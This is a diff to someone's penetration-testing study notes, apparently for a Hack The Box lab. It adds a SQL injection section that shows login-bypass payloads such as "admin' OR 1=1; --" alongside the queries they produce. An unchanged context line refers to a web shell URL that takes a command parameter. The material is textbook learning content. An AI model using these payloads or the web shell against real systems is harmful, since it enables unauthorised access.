@@ -1,5 +1,7 @@
 TCP/3306
 
+[[SQL Injection]]
+
 ```
 mysql --help 
 ``` 
@@ -203,3 +205,62 @@ Go to
 http://inlanefreight.htb/test2.php?c=[cmd here]
 ```
 
+---
+
+# SQL Injection
+
+```
+# LOGIN FORM
+username: ***
+password: ***
+```
+
+```sqlite
+SELECT * FROM user_table WHERE username='' AND password='';
+```
+
+# ALWAYS TRUE ATTACK
+
+## ERROR-BASED SQLi, Always True Attack
+
+# 
+
+```
+# LOGIN FORM
+username: admin
+password: 1234
+```
+
+```
+'
+username: admin'
+password: 1234
+```
+
+```sqlite
+SELECT * FROM user_table WHERE username='admin'' AND password='1234';
+```
+
+```
+' OR 1=1
+username: admin' OR 1=1
+password: 1234
+```
+
+```sqlite
+SELECT * FROM user_table WHERE username='admin' OR 1=1' AND password='1234';
+```
+
+```
+' OR 1=1 ; -- 
+username: admin' OR 1=1
+password: 1234
+```
+
+```sqlite
+SELECT * FROM user_table WHERE username='admin' OR 1=1; -- ' AND password='1234';
+
+SELECT * FROM user_table WHERE username='admin' OR 1=1;
+SELECT * FROM user_table WHERE 1=1;
+SELECT * FROM user_table;
+```
